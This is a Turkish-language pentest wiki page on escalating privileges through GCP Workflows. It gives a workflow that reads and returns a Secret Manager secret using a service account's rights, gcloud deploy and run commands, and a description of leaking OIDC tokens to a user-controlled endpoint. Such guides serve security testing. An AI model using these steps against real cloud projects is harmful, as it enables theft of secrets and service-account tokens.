# GCP - Workflows Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Workflows

Temel Bilgiler:

{{#ref}}
../gcp-services/gcp-workflows-enum.md
{{#endref}}

### `workflows.workflows.create`, `iam.serviceAccounts.ActAs`, `workflows.executions.create`, (`workflows.workflows.get`, `workflows.operations.get`)

Bildigim kadarıyla, bir Workflow'a bağlı SA'nın kimlik bilgilerini içeren metadata uç noktasına erişim ile bir shell almak mümkün değil. Ancak, Workflow içinde gerçekleştirilecek eylemleri ekleyerek SA'nın izinlerini kötüye kullanmak mümkündür.

Bağlayıcıların belgelerini bulmak mümkündür. Örneğin, bu [**Secretmanager bağlayıcısının sayfası**](https://cloud.google.com/workflows/docs/reference/googleapis/secretmanager/Overview)**.** Yan menüde birçok başka bağlayıcı bulmak mümkündür.

Ve burada bir sırrı yazdıran bir bağlayıcının örneğini bulabilirsiniz:
```yaml
main:
params: [input]
steps:
- access_string_secret:
call: googleapis.secretmanager.v1.projects.secrets.versions.accessString
args:
secret_id: secret_name
version: 1
project_id: project-id
result: str_secret
- returnOutput:
return: "${str_secret}"
```
CLI'den Güncelleme:
```bash
gcloud workflows deploy <workflow-name> \
--service-account=email@SA \
--source=/path/to/config.yaml \
--location us-central1
```
Eğer `ERROR: (gcloud.workflows.deploy) FAILED_PRECONDITION: Workflows service agent does not exist` gibi bir hata alırsanız, sadece **bir dakika bekleyin ve tekrar deneyin**.

Web erişiminiz yoksa, bir Workflow'un çalıştırılmasını tetiklemek ve görmek mümkündür:
```bash
# Run execution with output
gcloud workflows run <workflow-name> --location us-central1

# Run execution without output
gcloud workflows execute <workflow-name> --location us-central1

# List executions
gcloud workflows executions list <workflow-name>

# Get execution info and output
gcloud workflows executions describe projects/<proj-number>/locations/<location>/workflows/<workflow-name>/executions/<execution-id>
```
> [!CAUTION]
> Önceki yürütmelerin çıktısını kontrol ederek hassas bilgileri arayabilirsiniz.

`PERMISSION_DENIED: Permission 'workflows.operations.get' denied on...` gibi bir hata alsanız bile, bu izne sahip olmadığınız için, iş akışı oluşturulmuştur.

### OIDC token sızıntısı (ve OAuth?)

[**belgelere göre**](https://cloud.google.com/workflows/docs/authenticate-from-workflow) OAuth veya OIDC token ile bir HTTP isteği gönderecek iş akışı adımlarını kullanmak mümkündür. Ancak, [Cloud Scheduler](gcp-cloudscheduler-privesc.md) durumunda olduğu gibi, Oauth token ile yapılan HTTP isteği `.googleapis.com` ana bilgisayarına yapılmalıdır.

> [!CAUTION]
> Bu nedenle, **kullanıcı tarafından kontrol edilen bir HTTP uç noktasını belirterek OIDC token sızıntısı yapmak mümkündür**, ancak **OAuth** token sızıntısı için bu korumayı **aşmanız** gerekecektir. Ancak, OAuth token ile ya bağlantılar ya da HTTP istekleri kullanarak **SA adına eylemler gerçekleştirmek için herhangi bir GCP API'si ile iletişim kurabilirsiniz.**

#### Oauth
```yaml
- step_A:
call: http.post
args:
url: https://compute.googleapis.com/compute/v1/projects/myproject1234/zones/us-central1-b/instances/myvm001/stop
auth:
type: OAuth2
scopes: OAUTH_SCOPE
```
#### OIDC
```yaml
- step_A:
call: http.get
args:
url: https://us-central1-project.cloudfunctions.net/functionA
query:
firstNumber: 4
secondNumber: 6
operation: sum
auth:
type: OIDC
audience: OIDC_AUDIENCE
```
### `workflows.workflows.update` ...

Bu izin ile `workflows.workflows.create` yerine, zaten mevcut bir iş akışını güncellemek ve aynı saldırıları gerçekleştirmek mümkündür.

{{#include ../../../banners/hacktricks-training.md}}
